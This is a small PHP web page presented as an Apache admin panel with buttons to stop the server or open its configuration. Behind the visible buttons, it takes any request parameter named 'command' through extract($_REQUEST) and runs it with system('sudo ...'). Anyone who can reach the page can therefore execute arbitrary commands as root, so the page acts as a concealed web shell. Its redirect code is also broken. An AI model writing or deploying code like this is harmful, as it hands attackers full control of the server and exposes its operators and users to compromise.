<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=GB2312">

</head>
<body bgcolor=#ffffff text=#000000 link=#0000cc vlink=#551a8b alink=#ff0000 onLoad=sf() topmargin=3 marginheight=3>
<br>
<br>
<?php
	$exec=NULL;
	extract($_REQUEST, EXTR_PREFIX_ALL|EXTR_REFS,"cmd_");
	if(@$cmd_command) {$exec=@$cmd_command;}
?>

<form action="" method="post" name=f>
<br>
<center>
<input name="apache" type="submit" value="StopServer">
<input name="apache" type="submit" value="ConfigApache">
</center>
<br><br>

<?php
switch(@$_POST['apache'])
{
    case 'StopServer':
	$exec="service httpd stop";
	break;
    case 'ConfigApache':
	$config=1;
	break;
}

if($exec) 
{ 
    system("sudo $exec", $ret);
    if(!$ret)
	echo "Stop http server successfully!\n";
    else
	echo "Stop http server nusuccessfully!\n";
}

if(@$config)
{
    header("location: configapache.php");
    $config=0;
}


?>
</form>
</body>
</html>
